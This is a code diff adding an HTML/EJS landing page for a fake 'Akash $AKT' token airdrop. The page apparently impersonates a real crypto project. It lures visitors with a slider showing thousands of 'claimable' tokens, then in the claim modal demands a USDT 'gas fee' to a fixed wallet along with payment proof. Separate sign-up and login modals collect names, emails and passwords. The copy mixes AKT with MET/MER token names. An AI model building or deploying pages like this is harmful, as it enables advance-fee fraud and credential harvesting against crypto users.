@@ -1,0 +1,398 @@
+<!-- views/index.html -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$AKT</title>
+    <link rel="stylesheet" href="/font/css/all.css">
+    <link rel="stylesheet" href="/boot5/bootstrap-5.3.1/css/bootstrap.css">
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+
+</head>
+
+<body>
+
+
+    <div class="container-fluid">
+        
+        <div class="navs fixed-top">
+
+            <div class="container   ">
+                <nav class="navbar navbar-expand-sm text-center ">
+                    <a class="navbar-brand" href="#"><img src="img/logo/download.jpg" alt="">Akash</a>
+                    <!-- views/index.ejs -->
+
+                    <% if (user.email != '') { %>
+                        <!-- Display user's email address if authenticated -->
+                        <div class="nav-item email">
+                            <%= user.email %>
+                        </div>
+                        <% } else { %>
+                            <!-- Display "Register" and "Login" buttons if not authenticated -->
+                            <button type="button" style="margin-right: 10px;" data-bs-toggle="modal"
+                                data-bs-target="#registrationModal">
+                                Sign up
+                            </button>
+
+                            <button type="button" data-bs-toggle="modal" data-bs-target="#loginModal">
+                                Login
+                            </button>
+                        <% } %>
+                            <!-- <% if (message) { %>
+                                <%= message %>
+                            <% } %> -->
+
+
+                </nav>
+            </div>
+        </div>
+        <div class=" mb-3 alert-danger error">
+            <% if (message) { %>
+                <div class="alert alert-<%= messageType %>">
+                    <%= message %>
+                    <button class="btn-close" style="float: right  ;" data-bs-dismiss="alert"></button>
+
+                </>
+                <% } %>
+        </div>
+        <!--hero  -->
+        <div class="hero text-center container">
+            <div class="dist">
+                <h3>claimed assets will be distributed on 7th May, 2023</h3>
+                <div class="countdown" id="countdown"></div>
+            </div>
+            <div class="heroimg row">
+                <div class="col-md-7">
+                    <div class="text-start herotext">
+                        <h3>Akash</h3>
+                        <p>Driving the Most Dynamic Liquidity</p>
+                    </div>
+                </div>
+
+                <div class="col-md-5">
+                    <img src="img/logo/akask.jpg" class=" img-fluid animate__animated animate__pulse animate__infinite">
+                </div>
+
+
+            </div>
+            <div class="">
+
+                <div class="col-md-6">
+                    <h3>Claim up to <b id="counter">45000</b> <b>$AKT</b></h3>
+                    <p>Akash tokens will be transferred to your AKT wallet after the countdown automatically.</p>
+
+                    <div class="slider-container">
+                        <input type="range" class="slider" id="myRange" min="0" max="100" value="0">
+                        <div class="slider-fill" id="sliderFill"></div>
+                    </div>
+                    <div class="dollar-counter" id="dollarCounter">Gas fee: $ 15</div>
+                    <div class="met-counter" id="metCounter">$AKT Token Value: $0.00</div>
+                    <div class="claim">
+                        <button onclick="openpay()" type="button" data-bs-toggle="modal" data-bs-target="#airdropModal">
+                            Claim
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+            <div class="main mt-5">
+
+
+                <div class="imagesec">
+                    <img class="img-fluid" src="img/Screenshot (43).png" alt="">
+
+                    <p>
+                        Claim your $AKT with 89,067,988,000 $AKT tokens in Circulation.......The Akash community has
+                        designed the greatest LP stimulus
+                        program ever to drive liquidity and grow AKT's TVL
+                    </p>
+                </div>
+
+            </div>
+            <div>
+
+                <div class="row text-start text-dark container allcards">
+                    <h1 class="text-white">Our dynamic protocols include</h1>
+                    <div class="col-md-4 first cards">
+                        <h1>DLMM</h1>
+                        <p>Our Dynamic Liquidity Market Maker gives LPs access to dynamic fees and precise liquidity
+                            concentration all in real-time.</p>
+                    </div>
+                    <div class="col-md-4 second cards">
+                        <h1>Dynamic Pools</h1>
+                        <p>LPs earn from trading fees and lending yield in these easy-to-use AMM pools.</p>
+                    </div>
+                    <div class="col-md-4 third cards">
+                        <h1>Dynamic Vaults</h1>
+                        <p>A composable lending aggregator that rebalances capital every minute from top lending
+                            protocols allowing idle capital anywhere to earn yield.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="last">
+                <div class="row text-start">
+                    <div class="col-md-4">
+                        <h2><b>Expert DAO</b></h2>
+                        <h3>Akash has gather the most diamond handed OGs, and the most knowledgeable DeFi experts to
+                            build the most effective mission-driven DAO.
+                        </h3>
+                        <a href="https://akash.network/community/akash-insiders/" type="button">Join our discord
+                            channel</a>
+                    </div>
+                    <div class="col-md-8">
+                        <img class="img-fluid mt-3" src="img/logo/Screenshot (44).png" alt="">
+                    </div>
+                </div>
+                <div class="alloc">
+
+                    <div class="row">
+                        <h4>Allocation</h4>
+                        <div class="col-md-2">
+                            <h5> MER holdings</h5>
+                            <div class="line"></div>
+                            <span>345,059,034,003 (in circulation)</span>
+                        </div>
+                        <div class="col-md-2"><i class="fas fa-x"></i></div>
+                        <div class="col-md-2">
+                            <span>20,000,000,000 MET</span>
+                        </div>
+                        <div class="col-md-2"></div>
+
+                        <div class="col-md-4 text-start">
+                            <ul>
+                                <li><span>
+                                        Excludes FTX/Alameda associated wallets</span></li>
+                                <li> <span>Includes 50% of investor/team's unvested MER tokens</span></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+
+    <!-- Modal -->
+    <div class="modal fade" id="registrationModal" tabindex="-1" aria-labelledby="registrationModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="registrationModalLabel">Registration Form</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+
+                    <form action="/register" method="POST">
+
+                        <div class="mb-3">
+                            <label for="fullName" class="form-label">Full Name</label>
+                            <input type="text" class="form-control" id="fullName" name="fullName"
+                                placeholder="Enter your full name">
+                        </div>
+                        <div class="mb-3">
+                            <label for="email" class="form-label">Email address</label>
+                            <input type="email" class="form-control" id="email" name="email"
+                                placeholder="Enter your email">
+                        </div>
+                        <div class="mb-3">
+                            <label for="password" class="form-label">Password</label>
+                            <input type="password" class="form-control" id="password" name="password"
+                                placeholder="Enter your password">
+                        </div>
+                        <button type="submit" class="tweet py-2 px-3">Register</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- login modal -->
+    <div class="modal fade" id="loginModal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="loginModalLabel">Login Form</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+
+                    <form action="/login" method="POST">
+
+
+                        <div class="mb-3">
+                            <label for="email" class="form-label">Email address</label>
+                            <input type="email" class="form-control" id="email" name="email"
+                                placeholder="Enter your email">
+                        </div>
+                        <div class="mb-3">
+                            <label for="password" class="form-label">Password</label>
+                            <input type="password" class="form-control" id="password" name="password"
+                                placeholder="Enter your password">
+                        </div>
+                        <button type="submit" class="tweet py-2 px-3">Login</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- airdrop modal -->
+    <div class="modal fade" id="airdropModal" tabindex="-1" aria-labelledby="airdropModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="airdropModalLabel">Claim Airdrop</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form
+                     action="/claim" method="POST" enctype="multipart/form-data">
+                        <div class="mb-3">
+                            <label for="walletAddress" class="form-label">USDT TRC20 Wallet Address</label>
+                            <input type="text" class="form-control" value="bhvkfvkjnlgbnongonfwnkngkjnfwkjn"
+                                id="walletAddress" name="walletAddress" readonly>
+                        </div>
+                        <div class="mb-3">
+                            <label for="paymentProof" class="form-label">Payment Proof</label>
+                            <input type="file" class="form-control" id="paymentProof" name="paymentProof"
+                                accept=".pdf, .jpg, .png" required>
+                        </div>
+                        <div class="mb-3">
+                            <label for="walletinput">AKT wallet address</label>
+                            <input type="text" class="form-control" placeholder="Enter your AKT Wallet address"
+                                name="walletinput" id="walletAddressInput" required>
+
+                        </div>
+                        <input readonly id="gasFee" name="gasfee"></input>
+                        <button type="submit" class="btn btn-primary">Claim</button>
+                    </form>
+                    <script>
+                    //     document.getElementById('fform').onsubmit=(e)=>{
+                    //     e.preventDefault();
+                    //     const formData = new FormData(e.target);
+                    //     console.log(formData.get('walletinput'));
+                    // }
+                    </script>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+</body>
+<script src="/font/js/all.js"></script>
+<script src="/boot5/bootstrap-5.3.1/js/bootstrap.js"></script>
+<script>
+    const range = document.getElementById('myRange');
+    const sliderFill = document.getElementById('sliderFill');
+    const counter = document.getElementById('counter');
+    const dollarCounter = document.getElementById('dollarCounter');
+    const metCounter = document.getElementById('metCounter');
+    const walletAddressInput = document.getElementById('walletAddressInput');
+
+    // Set initial width of the slider fill to match the initial value
+    const percent = (range.value - range.min) / (range.max - range.min) * 100;
+    sliderFill.style.width = percent + '%';
+
+    // Calculate and update counters based on initial value
+    updateCounters(range.value);
+
+    range.addEventListener('input', () => {
+        const value = range.value;
+        const percent = (value - range.min) / (range.max - range.min) * 100;
+        sliderFill.style.width = percent + '%';
+        updateCounters(value);
+    });
+
+    function updateCounters(value) {
+        // Update coin counter
+        const initialValue = 900;
+        const finalValue = 6300;
+        const increment = (finalValue - initialValue) / (range.max - range.min);
+        const currentValue = initialValue + increment * value;
+        counter.textContent = currentValue.toLocaleString();
+
+        // Update dollar counter (gas fee)
+        const initialDollars = 15;
+        const finalDollars = 45;
+        const dollarIncrement = (finalDollars - initialDollars) / (range.max - range.min);
+        const currentDollars = initialDollars + dollarIncrement * value;
+        dollarCounter.textContent = 'Gas fee: $' + currentDollars.toFixed(2);
+
+        // Update $MET token counter
+        const metTokenPrice = 3.9; // Price of $MET token per one
+        const metValue = metTokenPrice * currentValue;
+        metCounter.textContent = '$AKT Token Value: $' + metValue.toFixed(2);
+    }
+
+    // Function to handle claiming airdrop
+    function claimAirdrop() {
+        const walletAddress = walletAddressInput.value;
+        const rangeValue = range.value;
+        const gasFee = calculateGasFee(rangeValue);
+
+        // Display gas fee in modal
+        document.getElementById('gasFee').textContent = '$' + gasFee.toFixed(2);
+
+        // Open claim modal
+        const claimModal = new bootstrap.Modal(document.getElementById('airdropModal'));
+        claimModal.show();
+    }
+
+    // Function to calculate gas fee based on range value
+    function calculateGasFee(rangeValue) {
+        // Your gas fee calculation logic based on the range value
+        // Example calculation:
+        const initialDollars = 15;
+        const finalDollars = 45;
+        const gasFee = initialDollars + (finalDollars - initialDollars) / (range.max - range.min) * rangeValue;
+        return gasFee;
+    }
+
+    function openpay() {
+
+
+        document.getElementById('gasFee').value = document.getElementById('dollarCounter').innerHTML
+
+    }
+
+    // Set the date we're counting down to
+var countDownDate = new Date("Apr 30, 2024 00:00:00").getTime();
+
+// Update the countdown every 1 second
+var x = setInterval(function() {
+
+  // Get the current date and time
+  var now = new Date().getTime();
+    
+  // Calculate the distance between now and the countdown date
+  var distance = countDownDate - now;
+    
+  // Calculate days, hours, minutes, and seconds
+  var days = Math.floor(distance / (1000 * 60 * 60 * 10));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    
+  // Display the result in the element with id="countdown"
+  document.getElementById("countdown").innerHTML = days + "d " + hours + "h "
+  + minutes + "m " + seconds + "s ";
+    
+  // If the countdown is over, display a message
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("countdown").innerHTML = "EXPIRED";
+  }
+}, 1000);
+
+</script>
+
+</html>
